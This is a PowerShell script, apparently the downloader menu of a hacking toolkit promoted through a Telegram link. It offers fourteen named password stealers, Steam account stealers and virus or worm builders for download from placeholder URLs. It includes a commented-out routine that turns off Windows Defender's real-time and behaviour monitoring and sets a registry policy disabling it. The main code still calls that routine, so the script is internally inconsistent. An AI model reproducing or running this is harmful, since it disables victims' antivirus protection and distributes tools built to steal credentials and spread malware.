


# Функция для отображения логотипа
function Show-Logo {
    Write-Host "                       ___________                       ._.    _________       _____  __                           "
    Write-Host "                       \_   _____/____    _________.__.  | |   /   _____/ _____/ ____\/  |_                         "
    Write-Host "                        |    __|_\__  \  /  ___<   |  |  |_|   \_____  \ /  _ \   __\\   __\                        "
    Write-Host "                        |        \/ __ \_\___ \ \___  |  |-|   /        (  <_> )  |   |  |                          "
    Write-Host "                       /_______  |____  /____  >/ ____|  | |  /_______  /\____/|__|   |__|                          "
    Write-Host "                               \/     \/     \/ \/       |_|          \/                                            "
    Write-Host "_________        ___.                 _________             __  .__      ___________           .__   __   .__  __   "
    Write-Host "\_   ___ \___.__.\_ |__   ___________/   _____/__.__. _____/  |_|  |__   \__    ___/___   ____ |  | |  | _|__|/  |_ "
    Write-Host "/    \  \<   |  | | __ \_/ __ \_  __ \_____  <   |  |/    \   __\  |  \    |    | /  _ \ /  _ \|  | |  |/ /  \   __\"
    Write-Host "\     \___\___  | | \_\ \  ___/|  | \/        \___  |   |  \  | |   Y  \   |    |(  <_> |  <_> )  |_|    <|  ||  |  "
    Write-Host " \______  / ____| |___  /\___  >__| /_______  / ____|___|  /__| |___|  /   |____| \____/ \____/|____/__|_ \__||__|  "
    Write-Host "        \/\/          \/     \/             \/\/         \/          \/                                  \/         "
    Write-Host ""
    Write-Host "                                  +---------------------------------------------------+                             "
    Write-Host "                                  |     Telergam: https://t.me/+ZipppRAXqghhYjUy      |                             "
    Write-Host "                                  +---------------------------------------------------+                             "
}

# Отключение Windows Defender
# function Disable-WindowsDefender {
#    Write-Host "Disabling Windows Defender..."
#   Set-MpPreference -DisableRealtimeMonitoring $true
#   Set-MpPreference -DisableBehaviorMonitoring $true
#   Set-MpPreference -DisableBlockAtFirstSeen $true
#   Set-MpPreference -DisableIOAVProtection $true
#   Set-MpPreference -DisablePrivacyMode $true
#   Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true
#   reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
#}

# Функция для скачивания файлов
function Download-File {
    param (
        [string]$url,
        [string]$output
    )
    try {
        Write-Host "Downloading file from $url to $output..."
        Invoke-WebRequest -Uri $url -OutFile $output
        Write-Host "Download complete!"
    } catch {
        Write-Host "Error downloading file: $_"
    }
}

# Ссылки и названия файлов
$files = @{
    1 = @{ Name = "   1337 SteamACC Stealer"; Url = "https://example.com/file1.zip" }
    2 = @{ Name = "   Allround Stealler"; Url = "https://example.com/file2.zip" }
    3 = @{ Name = "   Codesoft PW Stealer"; Url = "https://example.com/file3.zip" }
    4 = @{ Name = "   Dark Screen Stealer 2"; Url = "https://example.com/file4.zip" }
    5 = @{ Name = "   Firefox Password Stealer"; Url = "https://example.com/file5.zip" }
    6 = @{ Name = "   Fudsonly Stealer"; Url = "https://example.com/file6.zip" }
    7 = @{ Name = "   Multi Password Stealer"; Url = "https://example.com/file7.zip" }
    8 = @{ Name = "   ProStealer"; Url = "https://example.com/file8.zip" }
    9 = @{ Name = "   SimpleStealer"; Url = "https://example.com/file9.zip" }
    10 = @{ Name = "  Steam Stealer by till7"; Url = "https://example.com/file10.zip" }
    11 = @{ Name = "  Dr.VBS Virus Maker"; Url = "https://example.com/file11.zip" }
    12 = @{ Name = "  Hell P2P Worms Generator"; Url = "https://example.com/file12.zip" }
    13 = @{ Name = "  In Shadow Batch Virus Gen"; Url = "https://example.com/file13.zip" }
    14 = @{ Name = "  Kill Switch - Virus Builder"; Url = "https://example.com/file14.zip" }
}

# Функция для отображения меню с рамкой
function Show-Menu {
    Write-Host "                                        +---------------------------------------+"
    Write-Host "                                        |                 Menu                  |"
    Write-Host "                                        +---------------------------------------+"

    # Цикл для вывода файлов
    foreach ($key in ($files.Keys | Sort-Object)) {
        $fileLine = "$key. $($files[$key].Name)"
        Write-Host ("                                        | " + $fileLine.PadRight(37) + " |")
    }

    Write-Host "                                        +---------------------------------------+"
    Write-Host "                                        |99.              Exit                  |" 
    Write-Host "                                        +---------------------------------------+"
}


# Отключение Windows Defender
Disable-WindowsDefender

# Главный цикл программы
while ($true) {
    Clear-Host  # Очистка экрана перед выводом логотипа и меню
    Show-Logo   # Вывод логотипа
    Show-Menu   # Вывод меню выбора

    $choice = Read-Host "Enter a number"
    
    if ($choice -eq 99) {
        Write-Host "Exiting..."
        break
    } elseif ($files.ContainsKey($choice)) {
        $file = $files[$choice]
        $url = $file.Url
        $output = "C:\Downloads\$($file.Name)"
        Download-File -url $url -output $output
    } else {
        Write-Host "Error. Try again."
    }
}
